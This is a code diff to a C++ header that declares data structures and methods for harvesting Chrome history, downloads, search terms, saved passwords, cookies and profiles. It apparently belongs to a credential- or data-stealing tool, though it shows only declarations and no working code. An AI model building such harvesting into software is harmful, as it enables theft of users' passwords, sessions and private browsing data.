@@ -13,7 +13,21 @@
 
 struct Chrome_History {
 	std::string strURL;
-	std::string strDate;
+	std::string strTitle;
+	std::string strVisitCount;
+	std::string strLastVisitTime;
+};
+
+struct Chrome_Download_History {
+	std::string strTargetPath;
+	std::string strStartTime;
+	std::string strTotalBytes;
+	std::string strTabURL;
+	std::string strMimeType;
+};
+
+struct Chrome_Search_Terms {
+	std::string strTerm;
 };
 
 struct Chrome_Login_Data {
@@ -23,16 +37,6 @@ struct Chrome_Login_Data {
 	std::string strPassword;
 };
 
-struct Chrome_Profile {
-	std::string strPath;
-	std::string strName;
-	std::string strGaiaName;
-	std::string strShortCutName;
-	std::string strUserName;
-	std::string strHostedDomain;
-};
-
-//cookies: creation_utc, host_key, name, encrypted_value, path, expires_utc, last_access_utc, last_update_utc
 struct Cookie {
 	std::string strCreationUTC;
 	std::string strHostKey;
@@ -42,6 +46,15 @@ struct Cookie {
 	std::string strExpiresUTC;
 	std::string strLastAccessUTC;
 	std::string strLastUpdateUTC;
+};
+
+struct Chrome_Profile {
+	std::string strPath;
+	std::string strName;
+	std::string strGaiaName;
+	std::string strShortCutName;
+	std::string strUserName;
+	std::string strHostedDomain;
 };
 
 class mod_Info {	
@@ -83,6 +96,7 @@ class mod_Info {
 		std::vector<Chrome_Profile> m_ChromeProfiles();
 		std::vector<Chrome_Login_Data> m_ProfilePasswords(const std::string& strUserPath);
 		std::vector<Cookie> m_ProfileCookies(const std::string& strUserPath, const std::string& name);
+		
 
 		std::vector<std::string> m_Usuarios();
 
